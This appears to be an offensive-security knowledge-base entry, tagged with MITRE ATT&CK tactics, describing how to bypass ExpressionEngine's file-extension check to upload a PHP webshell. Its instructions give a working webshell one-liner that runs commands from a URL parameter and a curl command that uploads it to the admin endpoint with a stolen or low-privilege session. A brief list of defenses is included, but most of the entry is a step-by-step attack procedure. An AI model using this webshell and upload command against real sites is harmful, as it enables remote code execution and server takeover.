---
tags:
  - file-upload
  - bypass
  - php
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-upload-php-file]]'
platforms:
  - Web
  - PHP
techniques:
  - '[[Remote File Copy]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 9b766898-45de-4cce-9a15-14756a3f95bf
created_at: '2025-12-14T05:32:13.232Z'
updated_at: '2025-12-14T05:32:13.232Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Remote File Copy]]'
---
# Bypass-File-Extension-Check-for-Malicious-PHP-Upload

## Summary

This procedure exploits the weak file extension validation in ExpressionEngine's upload feature to upload a malicious PHP file, enabling code injection on the server.

## Description

The vulnerability stems from improper sanitization in the file upload handler, allowing .php files despite checks for safe extensions like .jpg or .pdf. Attackers create a PHP webshell and upload it via the authenticated session. The file is stored in a web-accessible directory, bypassing restrictions. This leads to potential RCE upon access.

## Requirements

1. Authenticated session from low-priv user
2. Malicious PHP payload file (e.g., simple system() call)
3. Knowledge of upload endpoint (e.g., /admin.php?/cp/files/upload)

## Defense

Defensive measures and detection strategies:

- Implement server-side MIME type validation and content scanning
- Restrict uploads to non-executable directories
- Use WAF rules to block PHP in uploads

## Objectives

1. Upload executable code disguised as allowed file
2. Store file in accessible path
3. Confirm upload without errors

## Instructions

### Step 1: Prepare Payload

**Context**: Create a PHP file with RCE capabilities.

Create shell.php: `<?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?>`

> This allows command execution via URL parameter.

### Step 2: Upload via Curl

**Context**: Submit the file using authenticated session to bypass extension check.

**Command** ([[commands/curl-upload-php-file]]):
```bash
curl -X POST -F "userfile=@shell.php" -F "send=Upload" -b "exp_sessiontype=1; exp_lastvisit=...; exp_sessionid=..." https://target.com/admin.php?/cp/files/upload
```

> Replace session cookies with those from login. Expected output: Success message and file path.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Remote File Copy]]

### Sub-Techniques


## Commands Used

- [[commands/curl-upload-php-file]]

## Tools Used


## Tags

- [[file-upload]]
- [[bypass]]
- [[rce]]
